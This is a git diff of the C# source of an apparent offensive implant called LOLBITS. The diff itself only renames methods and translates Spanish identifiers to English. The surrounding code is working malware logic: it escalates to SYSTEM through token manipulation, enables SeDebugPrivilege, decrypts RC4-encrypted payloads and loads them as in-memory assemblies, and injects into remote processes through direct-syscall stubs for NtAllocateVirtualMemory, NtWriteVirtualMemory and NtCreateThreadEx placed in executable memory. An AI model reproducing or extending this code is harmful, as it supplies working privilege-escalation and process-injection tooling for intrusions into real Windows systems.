@@ -265,7 +265,7 @@ namespace LOLBITS
                         {
 
                             if (Utils.IsHighIntegrity(_sysCall))
-                                rps = _tokenManager.getSystem() ? "We are System!\n" : "ERR:Process failed! Is this process running with high integrity level?\n";
+                                rps = TokenManager.GetSystem() ? "We are System!\n" : "ERR:Process failed! Is this process running with high integrity level?\n";
                             else
                                 rps = "ERR:Process failed! Is this process running with high integrity level?\n";
 
@@ -419,8 +419,8 @@ namespace LOLBITS
             byte[] content_decrypted = Encoding.UTF8.GetBytes(json_response);
             byte[] xKey = Encoding.ASCII.GetBytes(_p);
             byte[] content_encrypted = RC4.Encrypt(xKey, content_decrypted);
-            string hexadecimal = BiteArrayToHex.Convierte(content_encrypted);
-            string fileContent = Zipea.Comprime(hexadecimal);
+            string hexadecimal = BiteArrayToHex.Convert(content_encrypted);
+            string fileContent = Zipea.Compress(hexadecimal);
             File.WriteAllText(filePath, fileContent);
         }
 
@@ -429,8 +429,8 @@ namespace LOLBITS
 
             string fileStr = File.ReadAllText(filePath);
             byte[] xKey = Encoding.ASCII.GetBytes(_p);
-            string hexadecimal = Zipea.Descomprime(fileStr);
-            byte[] content_encrypted = StringHEXToByteArray.Convierte(hexadecimal); 
+            string hexadecimal = Zipea.Decompress(fileStr);
+            byte[] content_encrypted = StringHEXToByteArray.Convert(hexadecimal); 
             byte[] content_decrypted = RC4.Decrypt(xKey, content_encrypted);
             decrypted = content_decrypted;
             string content_encoded = Encoding.UTF8.GetString(content_decrypted);
@@ -450,8 +450,8 @@ namespace LOLBITS
         {
             string fileStr = File.ReadAllText(filePath);
             byte[] xKey = Encoding.ASCII.GetBytes(_p);
-            string hexadecimal = Zipea.Descomprime(fileStr);
-            byte[] content_encrypted = StringHEXToByteArray.Convierte(hexadecimal);
+            string hexadecimal = Zipea.Decompress(fileStr);
+            byte[] content_encrypted = StringHEXToByteArray.Convert(hexadecimal);
             byte[] content_decrypted = RC4.Decrypt(xKey, content_encrypted);
             Assembly dll = Assembly.Load(content_decrypted);
 
@@ -639,13 +639,13 @@ namespace LOLBITS
             if(pid != -1)
             {
                 IntPtr token = IntPtr.Zero;
-                Utils.getProcessToken(Process.GetCurrentProcess().Handle, Utils.TokenAccessFlags.TOKEN_ADJUST_PRIVILEGES, out token, syscall); 
+                Utils.GetProcessToken(Process.GetCurrentProcess().Handle, Utils.TokenAccessFlags.TokenAdjustPrivileges, out token, syscall); 
 
                 List<string> l = new List<string>();
                 l.Add("SeDebugPrivilege");
-                Utils.enablePrivileges(token, l);
+                Utils.EnablePrivileges(token, l);
 
-                Utils.getProcessHandle(pid, out handle, Utils.ProcessAccessFlags.CreateThread | Utils.ProcessAccessFlags.QueryInformation | 
+                Utils.GetProcessHandle(pid, out handle, Utils.ProcessAccessFlags.CreateThread | Utils.ProcessAccessFlags.QueryInformation | 
                     Utils.ProcessAccessFlags.VirtualMemoryOperation | Utils.ProcessAccessFlags.VirtualMemoryWrite | Utils.ProcessAccessFlags.VirtualMemoryRead);
             }
 
@@ -654,7 +654,7 @@ namespace LOLBITS
             {
 
                 IntPtr baseAddr = IntPtr.Zero;
-                byte[] shellcode = syscall.getSyscallASM("NtAllocateVirtualMemory");
+                byte[] shellcode = syscall.GetSysCallAsm("NtAllocateVirtualMemory");
                 var shellcodeBuffer = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length, AllocationType.RESERVE | AllocationType.COMMIT, MemoryProtection.EXECUTE_READWRITE);
                 Marshal.Copy(shellcode, 0, shellcodeBuffer, shellcode.Length);
                 var syscallDelegate = Marshal.GetDelegateForFunctionPointer(shellcodeBuffer, typeof(NtAllocateVirtualMemory));
@@ -666,7 +666,7 @@ namespace LOLBITS
                 {
                     baseAddr = (IntPtr)arguments[1]; //required!
 
-                    shellcode = syscall.getSyscallASM("NtWriteVirtualMemory");
+                    shellcode = syscall.GetSysCallAsm("NtWriteVirtualMemory");
                     shellcodeBuffer = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length, AllocationType.RESERVE | AllocationType.COMMIT, MemoryProtection.EXECUTE_READWRITE);
                     Marshal.Copy(shellcode, 0, shellcodeBuffer, shellcode.Length);
                     syscallDelegate = Marshal.GetDelegateForFunctionPointer(shellcodeBuffer, typeof(NtWriteVirtualMemory));
@@ -695,7 +695,7 @@ namespace LOLBITS
 
 
 
-                        shellcode = syscall.getSyscallASM("NtCreateThreadEx");
+                        shellcode = syscall.GetSysCallAsm("NtCreateThreadEx");
                         shellcodeBuffer = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length, AllocationType.RESERVE | AllocationType.COMMIT, MemoryProtection.EXECUTE_READWRITE);
                         Marshal.Copy(shellcode, 0, shellcodeBuffer, shellcode.Length);
                         syscallDelegate = Marshal.GetDelegateForFunctionPointer(shellcodeBuffer, typeof(NtCreateThreadEx64));
